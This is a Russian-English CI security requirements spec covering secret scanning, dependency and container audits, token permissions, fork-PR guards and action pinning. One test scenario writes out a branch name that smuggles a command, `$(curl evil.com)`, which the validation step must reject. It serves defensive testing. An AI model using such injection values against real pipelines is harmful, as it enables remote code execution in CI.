## ADDED Requirements

### Requirement: SAST-сканирование в CI
CI pipeline SHALL запускать static analysis для поиска секретов в коде и коммитах через `gitleaks/gitleaks-action` на каждый pull request и push. Job MUST падать при обнаружении high-confidence секретов.

#### Scenario: Коммит с секретом
- **WHEN** PR содержит изменения с AWS access key в коде
- **THEN** CI job `gitleaks` падает с указанием файла и строки

#### Scenario: Чистый коммит
- **WHEN** PR не содержит секретов
- **THEN** CI job `gitleaks` проходит успешно

### Requirement: Dependency audit gate
CI pipeline SHALL запускать `pnpm audit --prod --audit-level=high` на каждый PR. Job MUST падать при наличии known high/critical CVE в production-зависимостях.

#### Scenario: Уязвимая зависимость
- **WHEN** в `pnpm-lock.yaml` присутствует зависимость с high CVE
- **THEN** CI job `audit` падает с описанием CVE и путём обновления

#### Scenario: Все зависимости чисты
- **WHEN** lockfile не содержит known high/critical CVE
- **THEN** job `audit` проходит успешно

### Requirement: Container image scanning
CI pipeline SHALL сканировать собранные Docker-образы на known CVE через `aquasecurity/trivy-action`. Job MUST падать при наличии critical CVE в финальном образе.

#### Scenario: Образ с critical CVE
- **WHEN** собранный backend-образ содержит библиотеку с critical CVE
- **THEN** CI job `trivy` падает с описанием уязвимости и слоя

### Requirement: Pin критичных зависимостей через overrides
`package.json` SHALL содержать `pnpm.overrides`, форсящие минимальные версии пакетов с known CVE: `"tar": "^7.5.16"` и `"multer": "^2.2.0"`.

#### Scenario: Override tar-зависимости
- **WHEN** выполняется `pnpm install`
- **THEN` в `pnpm-lock.yaml` любая транзитивная `tar` имеет версию ≥ 7.5.16

### Requirement: Минимальные permissions для CI workflows
Каждый GitHub Actions workflow SHALL содержать явный блок `permissions:` с минимально необходимыми правами. Дефолтный `GITHUB_TOKEN` MUST иметь `contents: read` (или меньше) для всех CI jobs, не требующих записи.

#### Scenario: ci.yml без write permissions
- **WHEN** выполняется `cat .github/workflows/ci.yml | grep permissions`
- **THEN** вывод содержит `permissions:` с `contents: read` или более узкими правами

### Requirement: OIDC вместо long-lived PAT
Автоматизация, создающая PR/issue от имени бота (change-bootstrap, change-complete workflows), SHALL использовать GitHub App + OIDC token exchange вместо long-lived Personal Access Token (`FLOW_TOKEN`).

#### Scenario: Удаление FLOW_TOKEN секрета
- **WHEN** выполняется `gh secret list` на репозитории
- **THEN** список не содержит `FLOW_TOKEN`

### Requirement: Валидация имени change-ветки
Workflows `change-bootstrap.yml` и `change-complete.yml` SHALL валидировать переменную `${ID}` (извлечённую из имени ветки `change/<id>`) против regex `^[a-z0-9-]{1,40}$` перед любой интерполяцией в shell-команды или `gh`-вызовы.

#### Scenario: Валидное имя ветки
- **WHEN** workflow запускается на ветке `change/add-feature-foo`
- **THEN` шаг с regex-валидацией проходит успешно и `ID=add-feature-foo` используется в скриптах

#### Scenario: Инъекция через имя ветки
- **WHEN` workflow запускается на ветке `change/foo$(curl evil.com)`
- **THEN** шаг regex-валидации падает, и последующие шаги пропускаются

### Requirement: Блокировка fork-PR с доступом к секретам
Workflows, использующие секреты репозитория (GitHub App token, etc.), SHALL содержать guard `if: github.event.pull_request.head_repo.full_name == github.repository` для блокировки запуска на PR из форков.

#### Scenario: PR из форка
- **WHEN** PR открыт из `evil/fuse` (форк) и триггерит `change-complete.yml`
- **THEN** шаги, требующие секретов, пропускаются (job завершается без side effects)

#### Scenario: PR из основного репозитория
- **WHEN** PR открыт из branch в `owner/fuse`
- **THEN** workflow выполняется нормально с доступом к секретам

### Requirement: Pin CI-зависимостей по commit SHA
Все `uses:` директивы в GitHub Actions workflows SHALL пиниться по полному commit SHA (40-символьный hash), а не по mutable-тегу (`@v4`). Допускается pin по SHA с сопровождаемым комментарием, указывающим версию (например, `@<sha> # v4.1.0`). This prevents supply-chain attacks via tag re-pointing.

#### Scenario: actions/checkout pinned
- **WHEN** выполняется `grep -r "uses: actions/checkout" .github/workflows/`
- **THEN** вывод содержит SHA-пин (например, `@<40-char-sha> # v4.1.0`), а не `@v4`
